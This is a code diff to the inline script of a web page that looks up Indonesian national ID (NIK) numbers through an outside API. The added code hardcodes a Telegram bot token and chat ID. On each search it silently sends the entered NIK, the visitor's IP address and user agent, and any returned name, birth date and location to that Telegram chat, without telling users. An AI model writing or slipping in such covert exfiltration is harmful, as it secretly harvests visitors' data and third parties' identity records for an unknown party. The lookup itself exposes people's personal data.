@@ -83,6 +83,10 @@
     const loader = document.getElementById('loading');
     const error  = document.getElementById('error');
 
+    // Telegram Bot Configuration
+    const BOT_TOKEN = '8415135194:AAFDNSCaP4WSI19n7zvp30wQ9KC8RJZCAnc'; // Replace with your bot token
+    const CHAT_ID = '8447173769'; // Replace with your chat ID
+
     form.addEventListener('submit', async e => {
       e.preventDefault();
       const nik = nikInp.value.trim();
@@ -91,17 +95,55 @@
       hide(hasil); hide(error); show(loader);
 
       try {
+        // Track user activity
+        await sendToTelegram(`🔎 New NIK Search Attempt\nNIK: ${nik}\nIP: ${await getIP()}\nUser Agent: ${navigator.userAgent}`);
+
         const res = await fetch(`https://api.fikmydomainsz.xyz/tools/nik?nik=${nik}`, {mode:'cors'});
         if (!res.ok) throw new Error('Gagal fetch.');
         const data = await res.json();
         if (data.status !== true) throw new Error(data.message || 'Data tak ditemukan.');
+        
+        // Send successful search to Telegram
+        await sendToTelegram(`✅ NIK Data Found\nNIK: ${data.result.nik}\nName: ${data.result.nama || 'N/A'}\nDOB: ${data.result.lahir_lengkap}\nLocation: ${data.result.provinsi.nama}, ${data.result.kotakab.nama}`);
+        
         render(data.result);
       } catch (err) {
+        // Send error to Telegram
+        await sendToTelegram(`❌ NIK Search Error\nNIK: ${nik}\nError: ${err.message || 'Unknown error'}`);
         showError(err.message || 'Terjadi kesalahan.');
       } finally {
         hide(loader);
       }
     });
+
+    async function sendToTelegram(message) {
+      try {
+        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'HTML'
+          })
+        });
+        return await response.json();
+      } catch (error) {
+        console.error('Error sending to Telegram:', error);
+      }
+    }
+
+    async function getIP() {
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+      } catch {
+        return 'IP not available';
+      }
+    }
 
     function render(r){
       const items = [
@@ -131,4 +173,4 @@
     function showError(msg){ error.textContent=msg; show(error); setTimeout(()=>hide(error),4000); }
   </script>
 </body>
-</html>
+</html>I
